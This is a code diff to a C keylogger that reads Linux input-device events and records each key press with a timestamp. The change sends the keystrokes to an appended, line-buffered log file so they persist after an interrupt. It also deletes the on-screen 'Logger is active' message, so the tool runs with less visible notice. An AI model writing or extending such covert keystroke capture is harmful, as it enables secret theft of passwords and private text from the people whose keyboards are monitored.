@@ -89,24 +89,22 @@ static const char *key_names[KEY_MAX + 1] =
     [BTN_MIDDLE] = "MOUSE MIDDLE BUTTON",
 };
 
-void print_timestamp(void)
+void print_timestamp(FILE *stream)
 {
     time_t now = time(NULL);
     struct tm *t = localtime(&now);
     char buf[9];
     strftime(buf, sizeof(buf), "%H:%M:%S", t);
-    printf("[%s] ", buf);
+    fprintf(stream, "[%s] ", buf);
 }
 
 int main(int argc, char *argv[])
 {
-    if (argc != 2)
+    if (argc != 3)
     {
-        printf("Usage: %s <file>\n", argv[0]);
+        fprintf(stderr, "Usage: %s <input_device(file)> <log_file>\n", argv[0]);
         exit(1);
     }
-
-    printf("Logger is active >>> \n");
 
     int fDescr = open(argv[1], O_RDONLY);
 
@@ -115,6 +113,21 @@ int main(int argc, char *argv[])
         perror("Error");
         exit(1);
     }
+
+    FILE *outstream = fopen(argv[2], "a");
+    if (outstream == NULL)
+    {
+        perror("Error opening log file");
+        close(fDescr);
+        exit(1);
+    }
+    
+    /* 
+     * Set line buffering for not losing data if ctrl+C
+     */
+    setvbuf(outstream, NULL, _IOLBF, 0); 
+
+    FILE *stream = outstream;
 
     struct input_event iEvent;
 
@@ -137,7 +150,8 @@ int main(int argc, char *argv[])
         if (bytesRead == 0) break;
         if (bytesRead != sizeof(iEvent))
         {
-            printf("Incomplete input event\n");
+            print_timestamp(stream);
+            fprintf(stream, "Incomplete input event\n");
             break;
         }
         /*
@@ -155,18 +169,18 @@ int main(int argc, char *argv[])
             
             if (iEvent.code <= KEY_MAX && key_names[iEvent.code] != NULL) 
             {
-                print_timestamp();
-                if (shiftHeld && capsOn) printf("Key >>> (Shift + Caps + %s)\n", key_names[iEvent.code]);
-                else if (shiftHeld) printf("Key >>> (Shift + %s)\n", key_names[iEvent.code]);
-                else if (capsOn) printf("Key >>> (Caps + %s)\n", key_names[iEvent.code]);
+                print_timestamp(stream);
+                if (shiftHeld && capsOn) fprintf(stream, "Key >>> (Shift + Caps + %s)\n", key_names[iEvent.code]);
+                else if (shiftHeld) fprintf(stream, "Key >>> (Shift + %s)\n", key_names[iEvent.code]);
+                else if (capsOn) fprintf(stream, "Key >>> (Caps + %s)\n", key_names[iEvent.code]);
                 
-                else printf("Key >>> %s\n", key_names[iEvent.code]);
+                else fprintf(stream, "Key >>> %s\n", key_names[iEvent.code]);
             }
             
             else
             {
-                print_timestamp();
-                printf("UNKNOWN KEY CODE: %u\n", iEvent.code);
+                print_timestamp(stream);
+                fprintf(stream, "UNKNOWN KEY CODE: %u\n", iEvent.code);
             }      
         }
     }
